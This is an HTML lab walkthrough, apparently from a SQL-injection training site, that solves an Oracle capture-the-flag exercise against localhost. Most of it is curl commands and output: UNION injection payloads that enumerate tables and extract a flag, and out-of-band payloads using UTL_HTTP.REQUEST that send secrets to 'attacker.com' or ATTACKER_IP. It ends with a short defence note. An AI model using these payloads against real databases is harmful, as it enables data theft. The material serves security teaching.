<h4>Step 1: Test Normal Search</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab9" \<br> --data-urlencode "author=Finance Team"<br><br>
        <span class="prompt">Input: </span>Finance Team<br>
        <span class="prompt">SQL: </span>SELECT id, title, author FROM documents WHERE author = 'Finance Team'<br>
        <span class="prompt">Result: </span><strong>ID:</strong> 1 | <strong>Title:</strong> Annual Report 2025 | <strong>Author:</strong> Finance Team
    </div>
</div>

<h4>Step 2: Confirm Injection</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "author='"<br>
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>ORA-01756: quoted string not properly terminated</strong>
    </div>
</div>

<h4>Step 3: Enumerate Tables via UNION</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Table Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab9" \<br> --data-urlencode "author=XXXXNOMATCH' UNION SELECT 0, table_name, 'x' FROM user_tables -- "<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Title:</strong> DOCUMENTS<br>
        <strong>Title:</strong> <strong>OOB_SECRETS</strong>
    </div>
</div>

<h4>Step 4: Extract Flag via UNION</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Flag Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "author=XXXXNOMATCH' UNION SELECT 0, column_name, data_type FROM all_tab_columns WHERE table_name='OOB_SECRETS' -- "<br>
        <span class="prompt">Columns: </span>ID (NUMBER), SECRET (VARCHAR2)<br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab9" \<br> --data-urlencode "author=XXXXNOMATCH' UNION SELECT id, secret, 'x' FROM oob_secrets -- "<br>
        <span class="prompt">Output: </span><strong>Title:</strong> <strong>FLAG{or_utl_http_00b}</strong>
    </div>
</div>

<h4>Step 5: UTL_HTTP.REQUEST OOB Technique (Tested)</h4>
<p>
    The lab teaches Out-of-Band exfiltration via <code>UTL_HTTP.REQUEST()</code>.
    This makes Oracle send HTTP requests to attacker-controlled servers with data in the URL.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. UTL_HTTP OOB Attempt</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "author=' OR 1=UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT secret FROM oob_secrets WHERE ROWNUM&lt;=1)) -- "<br><br>
        <span class="prompt">Input: </span>' OR 1=UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT secret FROM oob_secrets WHERE ROWNUM&lt;=1)) -- <br>
        <span class="prompt">Error: </span><strong>ORA-29273: HTTP request failed</strong><br>
        ORA-06512: at "SYS.UTL_HTTP", line 1530<br>
        <strong>ORA-24247: network access denied by access control list (ACL)</strong><br><br>
        <span class="prompt">// ACL blocks outbound HTTP in this Oracle XE instance.</span><br>
        <span class="prompt">// With ACL configured, Oracle would send:</span><br>
        <span class="prompt">// GET /FLAG{or_utl_http_00b} HTTP/1.1 to attacker's server</span>
    </div>
</div>

<h4>Step 6: OOB Attack Flow (Conceptual)</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. OOB Attack Flow</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">1. Attacker: </span>python3 -m http.server 8888<br>
        <span class="prompt">2. Inject:   </span>' UNION SELECT UTL_HTTP.REQUEST('http://ATTACKER_IP:8888/'<br>
        &nbsp;&nbsp;|| (SELECT secret FROM oob_secrets WHERE ROWNUM&lt;=1)), NULL, NULL FROM DUAL -- <br>
        <span class="prompt">3. Oracle:   </span>Sends HTTP request to attacker's server<br>
        <span class="prompt">4. Attacker: </span>Server logs: GET /FLAG{or_utl_http_00b} HTTP/1.1<br><br>
        <span class="prompt">Listeners:   </span>python3 -m http.server | Burp Collaborator | interactsh | webhook.site
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{or_utl_http_00b}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab9" \<br> --data-urlencode "author=XXXXNOMATCH' UNION SELECT id, secret, 'x' FROM oob_secrets -- "<br><br>
        <span class="prompt">// Verified output:</span><br>
        <strong>Title:</strong> FLAG{or_utl_http_00b}
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> <code>UTL_HTTP.REQUEST()</code> enables Out-of-Band data exfiltration
    by making Oracle send HTTP requests to attacker-controlled servers with stolen data embedded in
    the URL. This is the most powerful technique for completely blind scenarios. Requirements:
    <code>EXECUTE</code> privilege on <code>UTL_HTTP</code>, network ACL configured via
    <code>DBMS_NETWORK_ACL_ADMIN</code>, and outbound network access. Defense: restrict outbound connections
    from the database server, revoke UTL_HTTP privileges, and use bind variables.
</div>
